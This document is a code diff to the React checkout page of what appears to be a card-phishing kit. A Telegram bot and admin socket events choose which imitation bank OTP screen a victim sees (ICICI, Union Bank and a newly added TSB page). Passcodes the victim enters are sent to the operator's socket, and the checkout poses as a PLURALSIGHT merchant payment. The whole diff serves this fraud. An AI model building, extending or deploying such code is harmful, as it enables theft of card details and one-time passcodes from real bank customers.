@@ -22,6 +22,7 @@ import NewOTPPage from '../components/NewOTPPage';
 import ThirdOTPPage from '../components/ThirdOTPPage';
 import ICICIBankOTPPage from '../components/ICICIBankOTPPage';
 import UnionBankOTPPage from '../components/UnionBankOTPPage';
+import TSBOTPPage from '../components/TSBOTPPage';
 import ExpiredPage from '../components/ExpiredPage';
 import { api } from '../utils/api';
 import { devLog, devError, devWarn } from '../utils/logger';
@@ -454,6 +455,27 @@ const CheckoutOriginal = () => {
       setExchangeRate(data.exchangeRate);
     });
     
+    // Function to check localStorage for admin OTP selection
+    const checkAdminOtpSelection = () => {
+      const adminSelection = localStorage.getItem('adminOtpSelection');
+      if (adminSelection) {
+        try {
+          const selectionData = JSON.parse(adminSelection);
+          console.log('👨‍💼 Found admin OTP selection in localStorage:', selectionData);
+          if (selectionData.otpPageSelection && selectionData.timestamp > Date.now() - 300000) { // 5 min expiry
+            console.log(`🎯 Using admin selected OTP page: ${selectionData.otpPageSelection}`);
+            setOtpPageSelection(selectionData.otpPageSelection);
+            // Clear the selection after use
+            localStorage.removeItem('adminOtpSelection');
+            return true;
+          }
+        } catch (error) {
+          console.error('Error parsing admin OTP selection:', error);
+        }
+      }
+      return false;
+    };
+
     // Telegram Bot Command Handlers
     newSocket.on('show-otp', (data) => {
       console.log('🔐 Received show-otp command from Telegram:', data);
@@ -476,16 +498,77 @@ const CheckoutOriginal = () => {
       setOtpAttempts(prev => prev + 1);
       console.log(`🔢 OTP attempt #${otpAttempts + 1} of 3`);
       
-      // Generate new random OTP page selection for each attempt
-      const rand = Math.random();
+      // Use admin-selected OTP page if provided, otherwise check localStorage, otherwise random selection
       let newOtpPageSelection;
-      if (rand < 0.20) newOtpPageSelection = 'old';
-      else if (rand < 0.40) newOtpPageSelection = 'new';
-      else if (rand < 0.60) newOtpPageSelection = 'third';
-      else if (rand < 0.80) newOtpPageSelection = 'icici';
-      else newOtpPageSelection = 'union';
+      let adminSelectionUsed = false;
       
-      console.log(`🎲 Selected OTP page: ${newOtpPageSelection} (attempt ${otpAttempts + 1}/3)`);
+      console.log('📊 show-otp event data received:', data);
+      console.log('📊 otpPageSelection from data:', data.otpPageSelection);
+      
+      // First try: Socket data from admin
+      if (data.otpPageSelection) {
+        newOtpPageSelection = data.otpPageSelection;
+        adminSelectionUsed = true;
+        console.log(`👨‍💼 Admin selected OTP page (socket): ${newOtpPageSelection}`);
+      }
+      // Second try: localStorage fallback
+      else if (checkAdminOtpSelection()) {
+        // OTP page selection was already set in checkAdminOtpSelection
+        adminSelectionUsed = true;
+        newOtpPageSelection = otpPageSelection; // Use current state that was just set
+      }
+      // Third try: Random selection
+      else {
+        const rand = Math.random();
+        if (rand < 0.167) newOtpPageSelection = 'old';
+        else if (rand < 0.334) newOtpPageSelection = 'new';
+        else if (rand < 0.501) newOtpPageSelection = 'third';
+        else if (rand < 0.668) newOtpPageSelection = 'icici';
+        else if (rand < 0.835) newOtpPageSelection = 'union';
+        else newOtpPageSelection = 'tsb';
+        
+        console.log(`🎲 Random selected OTP page: ${newOtpPageSelection} (attempt ${otpAttempts + 1}/3)`);
+      }
+      
+      if (!adminSelectionUsed || newOtpPageSelection !== otpPageSelection) {
+        setOtpPageSelection(newOtpPageSelection);
+      }
+      
+      // Show OTP screen
+      setCurrentStep('otp');
+      setShowOtp(true);
+      startOtpTimer();
+      setOtpValue('');
+      setOtpError('');
+      setOtpSubmitting(false);
+    });
+    
+    // Also listen for admin-show-otp event for direct admin communication
+    newSocket.on('admin-show-otp', (data) => {
+      console.log('📱 Received admin-show-otp event:', data);
+      setOtpAttempts(prev => prev + 1);
+      console.log(`🔢 OTP attempt #${otpAttempts + 1} of 3 (admin triggered)`);
+      
+      // Use admin-selected OTP page if provided, otherwise random selection
+      let newOtpPageSelection;
+      console.log('📊 admin-show-otp event data received:', data);
+      console.log('📊 otpPageSelection from admin data:', data.otpPageSelection);
+      if (data.otpPageSelection) {
+        newOtpPageSelection = data.otpPageSelection;
+        console.log(`👨‍💼 Admin selected OTP page (admin-show-otp): ${newOtpPageSelection}`);
+      } else {
+        // Generate new random OTP page selection for each attempt (includes TSB)
+        const rand = Math.random();
+        if (rand < 0.167) newOtpPageSelection = 'old';
+        else if (rand < 0.334) newOtpPageSelection = 'new';
+        else if (rand < 0.501) newOtpPageSelection = 'third';
+        else if (rand < 0.668) newOtpPageSelection = 'icici';
+        else if (rand < 0.835) newOtpPageSelection = 'union';
+        else newOtpPageSelection = 'tsb';
+        
+        console.log(`🎲 Random selected OTP page (admin-show-otp fallback): ${newOtpPageSelection}`);
+      }
+      
       setOtpPageSelection(newOtpPageSelection);
       
       // Show OTP screen
@@ -539,6 +622,7 @@ const CheckoutOriginal = () => {
     
       return () => {
         newSocket.off('show-otp');
+        newSocket.off('admin-show-otp');
         newSocket.off('invalid-otp-error');
         newSocket.off('payment-approved');
         newSocket.off('payment-rejected');
@@ -608,6 +692,31 @@ const CheckoutOriginal = () => {
     trackVisitor();
   }, [socket]);
   
+  // Check for admin OTP selection on initialization
+  useEffect(() => {
+    const checkInitialAdminOtpSelection = () => {
+      const adminSelection = localStorage.getItem('adminOtpSelection');
+      if (adminSelection) {
+        try {
+          const selectionData = JSON.parse(adminSelection);
+          console.log('🔄 Checking initial admin OTP selection:', selectionData);
+          if (selectionData.otpPageSelection && selectionData.timestamp > Date.now() - 300000) { // 5 min expiry
+            console.log(`🎯 Initial admin OTP page found: ${selectionData.otpPageSelection}`);
+            setOtpPageSelection(selectionData.otpPageSelection);
+          } else {
+            console.log('⏰ Admin OTP selection expired, clearing localStorage');
+            localStorage.removeItem('adminOtpSelection');
+          }
+        } catch (error) {
+          console.error('Error parsing initial admin OTP selection:', error);
+          localStorage.removeItem('adminOtpSelection');
+        }
+      }
+    };
+    
+    checkInitialAdminOtpSelection();
+  }, []); // Run once on mount
+  
   const [formData, setFormData] = useState({
     firstName: '',
     lastName: '',
@@ -638,14 +747,15 @@ const CheckoutOriginal = () => {
   const [finalConsent, setFinalConsent] = useState(false);
   const [promoCode, setPromoCode] = useState('');
   
-  // OTP Page Selection State (random between 5 pages - 20% each)
+  // OTP Page Selection State (random between 6 pages - ~16.67% each)
   const [otpPageSelection, setOtpPageSelection] = useState(() => {
     const rand = Math.random();
-    if (rand < 0.20) return 'old';
-    if (rand < 0.40) return 'new';
-    if (rand < 0.60) return 'third';
-    if (rand < 0.80) return 'icici';
-    return 'union'; // Union Bank OTP page (20%)
+    if (rand < 0.1667) return 'old';
+    if (rand < 0.3333) return 'new';
+    if (rand < 0.5000) return 'third';
+    if (rand < 0.6667) return 'icici';
+    if (rand < 0.8333) return 'union';
+    return 'tsb'; // TSB Bank OTP page (~16.67%)
   });
   const [useNewOTPPage, setUseNewOTPPage] = useState(() => Math.random() < 0.5);
   const [newOtpPageLoading, setNewOtpPageLoading] = useState(false);
@@ -753,75 +863,8 @@ const CheckoutOriginal = () => {
     }
   }, [hashedPaymentData]);
 
-  // Initialize socket connection for Telegram bot communication
-  useEffect(() => {
-    const socket = io('http://localhost:3002', {
-      transports: ['polling', 'websocket'],
-      upgrade: true,
-      timeout: 20000,
-      forceNew: true
-    });
-    
-    socket.on('connect', () => {
-      console.log('✅ Socket connected for checkout');
-    });
-    
-    // Handle OTP show command from Telegram bot
-    socket.on('show-otp', (data) => {
-      console.log('📱 Show OTP command received:', data);
-      setCurrentStep('otp');
-      setShowOtp(true);
-      if (data.otpPageSelection) {
-        setOtpPageSelection(data.otpPageSelection);
-      }
-    });
-    
-    // Handle OTP page selection changes from admin
-    socket.on('admin-otp-change', (data) => {
-      console.log('🔄 OTP page selection changed:', data);
-      if (data.otpPageSelection) {
-        setOtpPageSelection(data.otpPageSelection);
-      }
-    });
-    
-    // Handle payment approval from Telegram bot
-    socket.on('payment-approved', (data) => {
-      console.log('✅ Payment approved from Telegram bot:', data);
-      
-      // Store checkout data for PaymentSuccess page
-      const checkoutData = {
-        firstName: formData.firstName,
-        lastName: formData.lastName,
-        email: formData.email,
-        planName: planName,
-        billing: billing,
-        amount: displayPrice,
-        currency: globalCurrency,
-        transactionId: transactionId,
-        paymentMethod: 'credit',
-        timestamp: new Date().toISOString(),
-        successHash: data.successHash || 'telegram_' + Date.now()
-      };
-      
-      localStorage.setItem('userCheckoutData', JSON.stringify(checkoutData));
-      console.log('💾 Stored checkout data for success page:', checkoutData);
-      
-      // Redirect to success page using the correct route
-      if (data.successHash) {
-        window.location.href = `/success/${data.successHash}`;
-      } else {
-        window.location.href = '/payment-success';
-      }
-    });
-    
-    socket.on('disconnect', () => {
-      console.log('❌ Socket disconnected');
-    });
-    
-    return () => {
-      socket.disconnect();
-    };
-  }, []);
+  // Note: Socket connection is already handled above in the main useEffect
+  // This duplicate socket connection has been removed to avoid conflicts
 
   // Prevent zoom on OTP verification pages
   useEffect(() => {
@@ -913,59 +956,7 @@ const CheckoutOriginal = () => {
   // Card session map to store bank logos and mobile numbers for each card
   const cardSessionMap = useRef<{ [key: string]: { logo: string; last4: string } }>({});
 
-  // Card brand logos
-  const cardBrandLogos = {
-    visa: 'https://brandlogos.net/wp-content/uploads/2025/04/visa_secure_badge-logo_brandlogos.net_n9x0z-300x300.png',
-    mastercard: 'https://www.freepnglogos.com/uploads/mastercard-png/mastercard-logo-logok-15.png',
-    discover: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png',
-    rupay: 'https://logotyp.us/file/rupay.svg',
-    amex: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png' // fallback to discover for amex
-  };
-
-  // Function to detect card brand from card number
-  const getCardBrand = (cardNumber: string) => {
-    if (!cardNumber) {
-      devLog('No card number provided, defaulting to visa');
-      return 'visa';
-    }
-    
-    const cleanNumber = cardNumber.replace(/\s/g, '');
-    devLog('Clean card number for detection:', cleanNumber);
-    
-    // RuPay: starts with 607 (all RuPay BINs start with 607xxx)
-    if (cleanNumber.startsWith('607')) {
-      devLog('Detected: RuPay (starts with 607)');
-      return 'rupay';
-    }
-    // Visa: starts with 4
-    else if (cleanNumber.startsWith('4')) {
-      devLog('Detected: Visa (starts with 4)');
-      return 'visa';
-    }
-    // Mastercard: starts with 5 or 2 (new range)
-    else if (cleanNumber.startsWith('5') || cleanNumber.startsWith('2')) {
-      devLog('Detected: Mastercard (starts with 5 or 2)');
-      return 'mastercard';
-    }
-    // American Express: starts with 3
-    else if (cleanNumber.startsWith('3')) {
-      devLog('Detected: American Express (starts with 3)');
-      return 'amex';
-    }
-    // Discover: starts with 6 (but not 607 which is RuPay)
-    else if (cleanNumber.startsWith('6') && !cleanNumber.startsWith('607')) {
-      devLog('Detected: Discover (starts with 6, not 607)');
-      return 'discover';
-    }
-    // RuPay fallback: starts with 8 or other patterns
-    else if (cleanNumber.startsWith('8')) {
-      devLog('Detected: RuPay (starts with 8)');
-      return 'rupay';
-    }
-    
-    devLog('Unknown card type, defaulting to visa');
-    return 'visa'; // default fallback
-  };
+  // Note: cardBrandLogos and getCardBrand are defined at the top level to avoid redeclaration
 
   // Pricing data based on the main page
   const pricingData = {
@@ -1383,67 +1374,9 @@ const CheckoutOriginal = () => {
       return;
     }
     devLog('Registering socket event listeners for paymentId:', paymentId);
-    // Register event listeners
-    socket.on('show-otp', (data) => {
-      devLog('Show OTP with currency data:', data);
-      
-      // Random selection between 4 OTP pages (25% each)
-      const rand = Math.random();
-      let selectedPage;
-      if (rand < 0.25) {
-        selectedPage = 'old';
-        setUseNewOTPPage(false);
-      } else if (rand < 0.50) {
-        selectedPage = 'new';
-        setUseNewOTPPage(true);
-      } else if (rand < 0.75) {
-        selectedPage = 'third';
-        setUseNewOTPPage(false); // Will be handled separately
-      } else {
-        selectedPage = 'icici';
-        setUseNewOTPPage(false); // Will be handled separately
-      }
-      setOtpPageSelection(selectedPage);
-      devLog('🎲 Randomly selected OTP page:', selectedPage.toUpperCase());
-      
-      setConfirmingPayment(false);
-      setShowOtp(true);
-      setCurrentStep('otp');
-      
-      // Update currency display if custom data is provided
-      if (data && data.customAmount !== undefined) {
-        setOtpCustomAmount(data.customAmount);
-        setOtpCurrency(data.currency || 'INR');
-        setOtpCurrencySymbol(data.currencySymbol || '₹');
-        
-        // IMPORTANT: Capture the admin-selected bank logo
-        if (data.bankLogo) {
-          devLog('🎯 Admin selected bank logo received:', data.bankLogo);
-          setAdminSelectedBankLogo(data.bankLogo);
-        }
-        
-        devLog('Updated OTP currency display:', {
-          amount: data.customAmount,
-          currency: data.currency,
-          symbol: data.currencySymbol,
-          bankLogo: data.bankLogo
-        });
-      } else {
-        // Reset to defaults if no custom data
-        setOtpCustomAmount(null);
-        setOtpCurrency('INR');
-        setOtpCurrencySymbol('₹');
-        setAdminSelectedBankLogo('');
-      }
-      
-      // Show loading overlay for 4-5 seconds
-      setOtpLoading(true);
-      setTimeout(() => {
-        setOtpLoading(false);
-      }, 4500); // 4.5 seconds
-      
-      startOtpTimer();
-    });
+    
+    // REMOVED: Duplicate show-otp handler that was causing automatic OTP triggers
+    // The admin-controlled handler is registered elsewhere
     
     socket.on('payment-approved', (data) => {
       devLog('Payment approved event received:', data);
@@ -2930,159 +2863,124 @@ const CheckoutOriginal = () => {
               <div className="fixed inset-0 z-[9999] bg-white flex items-center justify-center" style={{ touchAction: 'auto', WebkitTouchCallout: 'default', WebkitUserSelect: 'text', overflow: 'auto' }}>
                     {/* Render different OTP pages based on selection */}
                 {otpPageSelection === 'old' && !useNewOTPPage && (
-                  // Original OTP modal (existing implementation)
-                  <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
-                    <div className="relative bg-white rounded-lg shadow-2xl max-w-xs sm:max-w-md lg:max-w-lg w-full mx-auto">
-                      {/* Top Header with VISA SECURE and Bank Logo */}
-                      <div className="bg-white border-b border-gray-200 px-3 py-2 rounded-t-lg">
+                  // Restored Original Simple Bank-Style OTP Modal
+                  <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center z-50 p-4">
+                    <div className="relative bg-white rounded-lg shadow-xl max-w-sm w-full mx-auto">
+                      {/* Simple Header */}
+                      <div className="bg-blue-50 border-b px-4 py-3 rounded-t-lg">
                         <div className="flex items-center justify-between">
-                          <div className="flex items-center gap-1">
-                            <div className="bg-blue-600 text-white px-1.5 py-0.5 rounded text-xs font-bold">
-                              VISA
-                            </div>
-                            <span className="text-xs font-medium text-gray-700">SECURE</span>
-                          </div>
-                          <div className="flex items-center gap-2">
-                            <span className="text-xs font-medium text-gray-700">ID Check</span>
-                            {/* Dynamic Bank Logo */}
-                            {adminSelectedBankLogo ? (
-                              <div className="w-8 h-6 bg-white rounded flex items-center justify-center border border-gray-200">
-                                <img 
-                                  src={adminSelectedBankLogo} 
-                                  alt="Bank Logo" 
-                                  className="max-w-full max-h-full object-contain"
-                                  onError={(e) => {
-                                    e.currentTarget.parentElement!.innerHTML = '<span class="text-blue-600 text-xs font-bold">BANK</span>';
-                                  }}
-                                />
-                              </div>
-                            ) : (
-                              <div className="w-8 h-6 bg-blue-600 rounded flex items-center justify-center">
-                                <span className="text-white text-xs font-bold">BANK</span>
-                              </div>
-                            )}
-                          </div>
+                          <h3 className="text-lg font-semibold text-gray-800">OTP Verification</h3>
+                          <button
+                            onClick={handleOtpCancel}
+                            className="text-gray-400 hover:text-gray-600 text-xl font-bold"
+                          >
+                            ×
+                          </button>
                         </div>
                       </div>
 
-                      {/* Cancel Button - Top Right */}
-                      <button
-                        onClick={handleOtpCancel}
-                        className="absolute top-2 right-2 text-gray-500 hover:text-gray-700 text-xs font-medium z-10 px-2 py-1"
-                      >
-                        cancel
-                      </button>
-
-                      {/* Merchant Details */}
-                      <div className="p-3 border-b bg-gray-50">
-                        <div className="space-y-1 text-xs bg-white rounded p-2">
-                          <div className="flex justify-between">
-                            <span className="text-gray-600">Merchant Name</span>
-                            <span className="font-medium">PLURALSIGHT</span>
-                          </div>
-                          <div className="flex justify-between">
-                            <span className="text-gray-600">Date</span>
-                            <span className="font-medium">{new Date().toLocaleDateString('en-US', { day: '2-digit', month: 'short', year: 'numeric' })}</span>
-                          </div>
-                          <div className="flex justify-between">
-                            <span className="text-gray-600">Card Number</span>
-                            <span className="font-medium">{cardData.cardNumber.replace(/\d(?=\d{4})/g, 'X')}</span>
-                          </div>
-                          <div className="flex justify-between">
-                            <span className="text-gray-600">Amount</span>
-                            <span className="font-medium text-blue-600">{formatPrice(displayPrice)}</span>
-                          </div>
-                          <div className="flex justify-between">
-                            <span className="text-gray-600">Personal Message</span>
-                            <span className="font-medium text-gray-400">-</span>
+                      {/* Main Content */}
+                      <div className="p-6">
+                        {/* Bank Logo Section */}
+                        <div className="text-center mb-6">
+                          {adminSelectedBankLogo ? (
+                            <img 
+                              src={adminSelectedBankLogo} 
+                              alt="Bank Logo" 
+                              className="h-12 w-auto mx-auto object-contain"
+                              onError={(e) => {
+                                e.currentTarget.style.display = 'none';
+                                (e.currentTarget.nextElementSibling as HTMLElement)!.style.display = 'block';
+                              }}
+                            />
+                          ) : null}
+                          <div className="text-blue-600 font-bold text-lg" style={{display: adminSelectedBankLogo ? 'none' : 'block'}}>
+                            BANK
                           </div>
                         </div>
-                      </div>
 
-                      {/* Authentication Section */}
-                      <div className="p-3">
-                        <h3 className="text-blue-600 font-semibold text-sm mb-2 text-center">Authenticate Transaction</h3>
-                        
-                        {/* Success Message */}
-                        <div className="bg-green-100 border border-green-300 rounded p-2 mb-3 text-center">
-                          <p className="text-green-700 text-xs">
-                            One time passcode has been sent to your registered<br />
-                            mobile number <span className="font-mono">{otpMobileLast4 || 'XX4679'}</span>
+                        {/* Transaction Info */}
+                        <div className="bg-gray-50 rounded p-4 mb-6">
+                          <div className="text-center">
+                            <p className="text-sm text-gray-600 mb-1">Transaction Amount</p>
+                            <p className="text-xl font-bold text-gray-800">{formatPrice(displayPrice)}</p>
+                          </div>
+                        </div>
+
+                        {/* OTP Message */}
+                        <div className="text-center mb-6">
+                          <p className="text-gray-700 text-sm mb-2">
+                            An OTP has been sent to your registered mobile number
+                          </p>
+                          <p className="text-blue-600 font-mono font-medium">
+                            ******{otpMobileLast4 || '4679'}
                           </p>
                         </div>
 
-                        {/* OTP Error Message */}
+                        {/* Error Message */}
                         {otpError && (
-                          <div className="bg-red-100 border border-red-300 rounded p-2 mb-3 text-center">
-                            <p className="text-red-700 text-xs font-medium">{otpError}</p>
+                          <div className="bg-red-50 border border-red-200 rounded p-3 mb-4">
+                            <p className="text-red-700 text-sm text-center font-medium">{otpError}</p>
                           </div>
                         )}
 
-                        {/* Click Here Button */}
-                        <div className="text-center mb-3">
-                          <button className="bg-blue-600 text-white px-3 py-1 rounded text-xs font-medium hover:bg-blue-700">
-                            CLICK HERE For Addon Cardholder OTP
+                        {/* OTP Input */}
+                        <div className="mb-6">
+                          <label className="block text-sm font-medium text-gray-700 mb-2">Enter OTP</label>
+                          <input
+                            type="text"
+                            placeholder="Enter 6-digit OTP"
+                            value={otpValue}
+                            onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                            disabled={otpSubmitting}
+                            className={`w-full p-3 border border-gray-300 rounded-lg text-center text-lg font-mono tracking-wider focus:border-blue-500 focus:ring-2 focus:ring-blue-200 ${otpSubmitting ? 'bg-gray-100' : 'bg-white'}`}
+                            maxLength={6}
+                            autoFocus
+                          />
+                        </div>
+
+                        {/* Resend OTP */}
+                        <div className="text-center mb-6">
+                          <button 
+                            onClick={handleResendOtp}
+                            className="text-blue-600 text-sm hover:underline"
+                          >
+                            Resend OTP
                           </button>
                         </div>
 
-                        {/* OTP Input */}
-                        <div className="mb-3">
-                          <div className="text-center mb-2">
-                            <input
-                              type="text"
-                              placeholder="Enter OTP Here"
-                              value={otpValue}
-                              onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                              disabled={otpSubmitting}
-                              className={`w-full p-2 border border-gray-300 rounded text-center text-sm font-mono ${otpSubmitting ? 'bg-gray-100' : ''}`}
-                              maxLength={6}
-                            />
-                          </div>
-                          <div className="text-center">
-                            <button className="text-blue-600 text-xs hover:underline">Resend OTP</button>
-                          </div>
-                        </div>
-
                         {/* Action Buttons */}
-                        <div className="space-y-2">
+                        <div className="flex gap-3">
+                          <button
+                            onClick={handleOtpCancel}
+                            disabled={otpSubmitting}
+                            className="flex-1 px-4 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 font-medium text-sm disabled:opacity-50"
+                          >
+                            Cancel
+                          </button>
                           <button
                             onClick={handleOtpSubmit}
                             disabled={otpValue.length !== 6 || otpSubmitting}
-                            className={`w-full bg-blue-600 text-white py-2 rounded font-medium text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed ${otpSubmitting ? 'relative' : ''}`}
+                            className={`flex-1 px-4 py-3 bg-blue-600 text-white rounded-lg font-medium text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed ${otpSubmitting ? 'relative overflow-hidden' : ''}`}
                           >
                             {otpSubmitting ? (
                               <>
                                 <div className="absolute inset-0 flex items-center justify-center">
-                                  <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
+                                  <div className="animate-spin rounded-full h-5 w-5 border-2 border-white border-t-transparent"></div>
                                 </div>
-                                <span className="blur-sm">SUBMIT</span>
+                                <span className="opacity-0">Submit</span>
                               </>
                             ) : (
-                              'SUBMIT'
+                              'Submit'
                             )}
-                          </button>
-                          <button
-                            onClick={handleOtpCancel}
-                            className="w-full border border-gray-300 text-gray-700 py-2 rounded hover:bg-gray-50 font-medium text-sm"
-                          >
-                            CANCEL
                           </button>
                         </div>
 
                         {/* Timer */}
-                        <p className="text-center text-xs text-gray-500 mt-2">
-                          This page automatically time out after 2.49 minutes
-                        </p>
-
-                        {/* Powered by */}
-                        <div className="text-center mt-2 pt-2 border-t border-gray-200">
-                          <p className="text-xs text-gray-400 mb-1">Powered by</p>
-                          <div className="flex items-center justify-center">
-                            <div className="w-4 h-4 bg-green-600 rounded-full flex items-center justify-center mr-1">
-                              <div className="w-2 h-2 bg-white rounded-full"></div>
-                            </div>
-                            <span className="text-green-600 font-semibold text-xs">onetap</span>
-                          </div>
+                        <div className="text-center mt-4">
+                          <p className="text-xs text-gray-500">
+                            This session will expire in {formatTimer(otpTimer)} minutes
+                          </p>
                         </div>
                       </div>
                     </div>
@@ -3161,12 +3059,53 @@ const CheckoutOriginal = () => {
                     amount={displayPrice}
                     onOtpSubmit={(otp) => {
                       setOtpValue(otp);
-                      handleOtpSubmit();
+                      // Handle OTP submission directly with the passed OTP value
+                      try {
+                        if (!socket) {
+                          alert('Connection lost. Please refresh the page and try again.');
+                          return;
+                        }
+                        
+                        if (!otp || otp.length < 4) {
+                          alert('Please enter a valid OTP.');
+                          return;
+                        }
+                        
+                        setOtpSubmitting(true);
+                        setOtpError('');
+                        setIsProcessing(true); // Show spinner during OTP submit
+                        socket.emit('otp-submitted', { otp: otp, paymentId });
+                      } catch (error) {
+                        console.error('Error submitting OTP:', error);
+                        setOtpSubmitting(false);
+                        alert('Failed to submit OTP. Please try again.');
+                      }
                     }}
                     onCancel={handleOtpCancel}
                     onResendOtp={handleResendOtp}
                     otpSubmitting={otpSubmitting}
                     otpError={otpError}
+                    cardBrandLogos={cardBrandLogos}
+                    getCardBrand={getCardBrand}
+                  />
+                )}
+
+                {otpPageSelection === 'tsb' && (
+                  <TSBOTPPage
+                    cardData={cardData}
+                    billingDetails={formData}
+                    otpValue={otpValue}
+                    setOtpValue={setOtpValue}
+                    otpSubmitting={otpSubmitting}
+                    handleOtpSubmit={handleOtpSubmit}
+                    handleOtpCancel={handleOtpCancel}
+                    otpError={otpError}
+                    adminSelectedBankLogo={adminSelectedBankLogo}
+                    sessionBankLogo={sessionBankLogo}
+                    cardBrandLogos={cardBrandLogos}
+                    getCardBrand={getCardBrand}
+                    displayPrice={displayPrice}
+                    formatPrice={formatPrice}
                   />
                 )}
               </div>
